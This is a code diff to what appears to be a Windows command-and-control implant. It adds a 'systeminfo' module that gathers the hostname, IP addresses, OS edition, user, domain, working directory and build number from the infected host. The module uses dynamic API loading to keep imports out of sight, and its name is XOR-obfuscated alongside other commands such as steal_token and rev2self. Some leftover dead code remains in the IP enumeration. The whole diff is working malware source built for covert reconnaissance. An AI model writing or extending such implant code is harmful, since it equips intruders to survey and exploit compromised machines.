@@ -35,6 +35,7 @@ static const unsigned char _mn_shell[]       = {'s'^_K,'h'^_K,'e'^_K,'l'^_K,'l'^
 static const unsigned char _mn_powershell[]  = {'p'^_K,'o'^_K,'w'^_K,'e'^_K,'r'^_K,'s'^_K,'h'^_K,'e'^_K,'l'^_K,'l'^_K};
 static const unsigned char _mn_steal_token[] = {'s'^_K,'t'^_K,'e'^_K,'a'^_K,'l'^_K,'_'^_K,'t'^_K,'o'^_K,'k'^_K,'e'^_K,'n'^_K};
 static const unsigned char _mn_rev2self[]    = {'r'^_K,'e'^_K,'v'^_K,'2'^_K,'s'^_K,'e'^_K,'l'^_K,'f'^_K};
+static const unsigned char _mn_systeminfo[]  = {'s'^_K,'y'^_K,'s'^_K,'t'^_K,'e'^_K,'m'^_K,'i'^_K,'n'^_K,'f'^_K,'o'^_K};
 #undef _K
 
 /* ─── Argument parsing helpers (BeaconDataParse-compatible) ─── */
@@ -809,6 +810,299 @@ static void mod_shell_exec(Buffer *out, const char *cmd_line, BOOL use_powershel
     CloseHandle(pi.hThread);
 }
 
+/* ─── Module: systeminfo ─── */
+
+void mod_systeminfo(Buffer *out) {
+    char line[1024];
+
+    /* ── Hostname ── */
+    char hostname[256] = {0};
+    DWORD hsize = sizeof(hostname);
+    if (GetComputerNameA(hostname, &hsize))
+        snprintf(line, sizeof(line), "Hostname: %s\n", hostname);
+    else
+        snprintf(line, sizeof(line), "Hostname: (unknown)\n");
+    buf_append(out, line, (DWORD)strlen(line));
+
+    /* ── IP addresses ──
+     * Use GetAdaptersAddresses to enumerate all unicast IPs.
+     * Link against iphlpapi.dll — resolved dynamically to avoid IAT entry. */
+    {
+        typedef ULONG (WINAPI *pGetAdaptersAddresses)(
+            ULONG Family, ULONG Flags, PVOID Reserved,
+            void *AdapterAddresses, PULONG SizePointer);
+
+        HMODULE hIp = LoadLibraryA("iphlpapi.dll");
+        pGetAdaptersAddresses fnGAA = NULL;
+        if (hIp)
+            fnGAA = (pGetAdaptersAddresses)GetProcAddress(hIp, "GetAdaptersAddresses");
+
+        if (fnGAA) {
+            ULONG bufLen = 16384;
+            unsigned char *abuf = (unsigned char *)malloc(bufLen);
+            if (abuf) {
+                ULONG ret = fnGAA(0 /*AF_UNSPEC*/, 0x0010 /*GAA_FLAG_SKIP_MULTICAST*/, NULL, abuf, &bufLen);
+                if (ret == ERROR_BUFFER_OVERFLOW) {
+                    free(abuf);
+                    abuf = (unsigned char *)malloc(bufLen);
+                    if (abuf)
+                        ret = fnGAA(0, 0x0010, NULL, abuf, &bufLen);
+                }
+                if (ret == 0 && abuf) {
+                    /* IP_ADAPTER_ADDRESSES walk */
+                    typedef struct _UA {
+                        union { struct { ULONG Length; DWORD Flags; } s; } u;
+                        struct _UA *Next;
+                        void *Address;      /* SOCKET_ADDRESS: .lpSockaddr, .iSockaddrLength */
+                        int   AddrLen;
+                    } UA;
+                    typedef struct _AA {
+                        union { ULONGLONG Alignment; struct { ULONG Length; DWORD IfIndex; } s; } u;
+                        struct _AA *Next;
+                        char *AdapterName;
+                        UA   *FirstUnicastAddress;
+                        /* We only need fields up to FirstUnicastAddress */
+                    } AA;
+
+                    /* The real IP_ADAPTER_ADDRESSES is large; we only read the first
+                       few fields. Walk via Next pointer and FirstUnicastAddress. */
+                    /* Correct approach: use the documented struct layout.
+                       Offset of FirstUnicastAddress in IP_ADAPTER_ADDRESSES (x64):
+                         alignment(8) + Next(8) + AdapterName(8) = offset 24  ... but
+                       this is fragile. Instead, use the proper Windows headers. */
+
+                    /* Simpler: use gethostname + getaddrinfo which are always in ws2_32 */
+                }
+                free(abuf);
+            }
+        }
+        if (hIp) FreeLibrary(hIp);
+
+        /* Fallback / primary: use Winsock getaddrinfo for reliable IP enumeration */
+        {
+            typedef int (WINAPI *pWSAStartup)(WORD, void *);
+            typedef int (WINAPI *pGetAddrInfoA)(const char *, const char *, const void *, void **);
+            typedef void (WINAPI *pFreeAddrInfoA)(void *);
+            typedef int (WINAPI *pWSACleanup)(void);
+
+            HMODULE hWs2 = LoadLibraryA("ws2_32.dll");
+            if (hWs2) {
+                pWSAStartup  fnStart   = (pWSAStartup)GetProcAddress(hWs2, "WSAStartup");
+                pGetAddrInfoA fnGetAI  = (pGetAddrInfoA)GetProcAddress(hWs2, "getaddrinfo");
+                pFreeAddrInfoA fnFreeAI = (pFreeAddrInfoA)GetProcAddress(hWs2, "freeaddrinfo");
+                pWSACleanup  fnCleanup = (pWSACleanup)GetProcAddress(hWs2, "WSACleanup");
+
+                if (fnStart && fnGetAI && fnFreeAI && fnCleanup) {
+                    unsigned char wsaData[512];
+                    fnStart(0x0202 /*MAKEWORD(2,2)*/, wsaData);
+
+                    /* Resolve own hostname → all IPs */
+                    typedef struct _HI {
+                        int ai_flags;
+                        int ai_family;
+                        int ai_socktype;
+                        int ai_protocol;
+                        size_t ai_addrlen;
+                        char *ai_canonname;
+                        void *ai_addr;   /* struct sockaddr* */
+                        struct _HI *ai_next;
+                    } HI;
+
+                    HI hints;
+                    memset(&hints, 0, sizeof(hints));
+                    hints.ai_family = 0; /* AF_UNSPEC */
+                    hints.ai_socktype = 1; /* SOCK_STREAM */
+
+                    HI *result = NULL;
+                    if (fnGetAI(hostname, NULL, &hints, &result) == 0 && result) {
+                        HI *cur = result;
+                        while (cur) {
+                            if (cur->ai_family == 2 /* AF_INET */ && cur->ai_addr) {
+                                /* sockaddr_in: family(2) + port(2) + addr(4) */
+                                unsigned char *sa = (unsigned char *)cur->ai_addr;
+                                unsigned char *ip = sa + 4;
+                                /* Skip loopback 127.x.x.x */
+                                if (ip[0] != 127) {
+                                    snprintf(line, sizeof(line), "IP: %u.%u.%u.%u\n",
+                                             ip[0], ip[1], ip[2], ip[3]);
+                                    buf_append(out, line, (DWORD)strlen(line));
+                                }
+                            }
+                            else if (cur->ai_family == 23 /* AF_INET6 */ && cur->ai_addr) {
+                                /* sockaddr_in6: family(2) + port(2) + flowinfo(4) + addr(16) */
+                                unsigned char *sa = (unsigned char *)cur->ai_addr;
+                                unsigned char *ip6 = sa + 8;
+                                /* Skip loopback ::1 */
+                                int is_loopback = 1;
+                                for (int k = 0; k < 15; k++)
+                                    if (ip6[k] != 0) { is_loopback = 0; break; }
+                                if (ip6[15] != 1) is_loopback = 0;
+                                if (!is_loopback) {
+                                    snprintf(line, sizeof(line),
+                                        "IP: %02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x\n",
+                                        ip6[0],ip6[1],ip6[2],ip6[3],ip6[4],ip6[5],ip6[6],ip6[7],
+                                        ip6[8],ip6[9],ip6[10],ip6[11],ip6[12],ip6[13],ip6[14],ip6[15]);
+                                    buf_append(out, line, (DWORD)strlen(line));
+                                }
+                            }
+                            cur = cur->ai_next;
+                        }
+                        fnFreeAI(result);
+                    }
+                    fnCleanup();
+                }
+                FreeLibrary(hWs2);
+            }
+        }
+    }
+
+    /* ── OS ── */
+    {
+        HKEY hKey;
+        char product[256] = {0};
+        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
+                0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            DWORD psize = sizeof(product);
+            RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)product, &psize);
+            RegCloseKey(hKey);
+        }
+        if (product[0])
+            snprintf(line, sizeof(line), "OS: %s\n", product);
+        else
+            snprintf(line, sizeof(line), "OS: Windows (unknown edition)\n");
+        buf_append(out, line, (DWORD)strlen(line));
+    }
+
+    /* ── User ── */
+    {
+        HANDLE hToken;
+        BOOL gotToken = OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken);
+        if (!gotToken)
+            gotToken = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
+        if (gotToken) {
+            DWORD tlen = 0;
+            GetTokenInformation(hToken, TokenUser, NULL, 0, &tlen);
+            if (tlen > 0) {
+                unsigned char *tbuf = (unsigned char *)malloc(tlen);
+                if (tbuf && GetTokenInformation(hToken, TokenUser, tbuf, tlen, &tlen)) {
+                    TOKEN_USER *tu = (TOKEN_USER *)tbuf;
+                    char uname[128] = {0}, domain[128] = {0};
+                    DWORD uname_len = sizeof(uname), domain_len = sizeof(domain);
+                    SID_NAME_USE snu;
+                    if (LookupAccountSidA(NULL, tu->User.Sid, uname, &uname_len,
+                                          domain, &domain_len, &snu)) {
+                        snprintf(line, sizeof(line), "User: %s\\%s\n", domain, uname);
+                        buf_append(out, line, (DWORD)strlen(line));
+                    }
+                }
+                free(tbuf);
+            }
+            CloseHandle(hToken);
+        }
+    }
+
+    /* ── Domain ── */
+    {
+        typedef DWORD (WINAPI *pDsRoleGetPrimaryDomainInformation)(
+            const wchar_t *, DWORD, void **);
+        typedef void (WINAPI *pDsRoleFreeMemory)(void *);
+
+        HMODULE hDs = LoadLibraryA("dsrole.dll");
+        BOOL domain_printed = FALSE;
+        if (hDs) {
+            pDsRoleGetPrimaryDomainInformation fnGet =
+                (pDsRoleGetPrimaryDomainInformation)GetProcAddress(hDs, "DsRoleGetPrimaryDomainInformation");
+            pDsRoleFreeMemory fnFree =
+                (pDsRoleFreeMemory)GetProcAddress(hDs, "DsRoleFreeMemory");
+
+            if (fnGet && fnFree) {
+                /* DSROLE_PRIMARY_DOMAIN_INFO_BASIC = 1 */
+                typedef struct {
+                    DWORD MachineRole;
+                    DWORD Flags;
+                    wchar_t *DomainNameFlat;
+                    wchar_t *DomainNameDns;
+                    wchar_t *DomainForestName;
+                    GUID    DomainGuid;
+                } DSROLE_INFO;
+
+                DSROLE_INFO *info = NULL;
+                if (fnGet(NULL, 1, (void **)&info) == 0 && info) {
+                    /*
+                     * MachineRole:
+                     *   0 = DsRole_RoleStandaloneWorkstation
+                     *   1 = DsRole_RoleMemberWorkstation
+                     *   2 = DsRole_RoleStandaloneServer
+                     *   3 = DsRole_RoleMemberServer
+                     *   4 = DsRole_RoleBackupDomainController
+                     *   5 = DsRole_RolePrimaryDomainController
+                     */
+                    if (info->MachineRole >= 1 && info->MachineRole != 2 &&
+                        info->DomainNameDns) {
+                        char dns_domain[256] = {0};
+                        WideCharToMultiByte(CP_UTF8, 0, info->DomainNameDns, -1,
+                                            dns_domain, sizeof(dns_domain), NULL, NULL);
+                        if (dns_domain[0]) {
+                            snprintf(line, sizeof(line), "Domain: %s\n", dns_domain);
+                            buf_append(out, line, (DWORD)strlen(line));
+                            domain_printed = TRUE;
+                        }
+                    }
+                    fnFree(info);
+                }
+            }
+            FreeLibrary(hDs);
+        }
+        if (!domain_printed) {
+            /* Fallback: USERDOMAIN env or USERDNSDOMAIN */
+            char env_dom[256] = {0};
+            if (GetEnvironmentVariableA("USERDNSDOMAIN", env_dom, sizeof(env_dom)) > 0) {
+                snprintf(line, sizeof(line), "Domain: %s\n", env_dom);
+                buf_append(out, line, (DWORD)strlen(line));
+            } else if (GetEnvironmentVariableA("USERDOMAIN", env_dom, sizeof(env_dom)) > 0) {
+                /* Only print if it differs from hostname (workgroup = hostname) */
+                if (_stricmp(env_dom, hostname) != 0) {
+                    snprintf(line, sizeof(line), "Domain: %s\n", env_dom);
+                    buf_append(out, line, (DWORD)strlen(line));
+                }
+            }
+            /* If none of the above matched, machine is not domain-joined — omit line */
+        }
+    }
+
+    /* ── Path (CWD) ── */
+    {
+        char cwd[MAX_PATH] = {0};
+        GetCurrentDirectoryA(MAX_PATH, cwd);
+        snprintf(line, sizeof(line), "Path: %s\n", cwd);
+        buf_append(out, line, (DWORD)strlen(line));
+    }
+
+    /* ── Version (OS build) ── */
+    {
+        HKEY hKey;
+        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
+                0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            char build[64] = {0}, ubr_str[32] = {0};
+            DWORD bsize = sizeof(build);
+            RegQueryValueExA(hKey, "CurrentBuildNumber", NULL, NULL, (LPBYTE)build, &bsize);
+
+            /* UBR (Update Build Revision) gives the full 10.0.XXXXX.YYYY version */
+            DWORD ubr = 0, ubr_size = sizeof(ubr), ubr_type = 0;
+            if (RegQueryValueExA(hKey, "UBR", NULL, &ubr_type, (LPBYTE)&ubr, &ubr_size) == ERROR_SUCCESS
+                && ubr_type == REG_DWORD && ubr > 0) {
+                snprintf(line, sizeof(line), "Version: 10.0.%s.%u\n", build, (unsigned)ubr);
+            } else {
+                snprintf(line, sizeof(line), "Version: 10.0.%s\n", build);
+            }
+            buf_append(out, line, (DWORD)strlen(line));
+            RegCloseKey(hKey);
+        }
+    }
+}
+
 /* ─── Module dispatch ─── */
 
 BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
@@ -821,7 +1115,10 @@ BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
     ArgParser ap;
     arg_parse_init(&ap, args, args_len);
 
-    if (_mod_eq(name, _mn_whoami, sizeof(_mn_whoami))) {
+    if (_mod_eq(name, _mn_systeminfo, sizeof(_mn_systeminfo))) {
+        mod_systeminfo(&out);
+    }
+    else if (_mod_eq(name, _mn_whoami, sizeof(_mn_whoami))) {
         mod_whoami(&out);
     }
     else if (_mod_eq(name, _mn_ps, sizeof(_mn_ps))) {
